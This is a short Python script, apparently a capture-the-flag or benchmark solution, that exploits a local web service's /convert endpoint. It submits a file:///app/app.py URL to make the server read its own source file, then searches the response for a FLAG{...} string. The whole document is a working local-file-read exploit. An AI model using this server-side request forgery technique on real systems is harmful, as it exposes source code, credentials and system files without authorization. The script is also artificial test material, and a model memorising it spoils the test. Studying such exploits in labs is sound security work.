import sys
import requests
import re

sys.stdout.reconfigure(line_buffering=True)

r = requests.post("http://127.0.0.1:32810/convert", data={'url': 'file:///app/app.py'})
sys.stdout.write(f"{r.status_code}\n")
sys.stdout.flush()

m = re.search(r'FLAG\{[a-fA-F0-9]{64}\}', r.text)
if m:
    sys.stdout.write(f"{m.group(0)}\n")
    sys.stdout.flush()

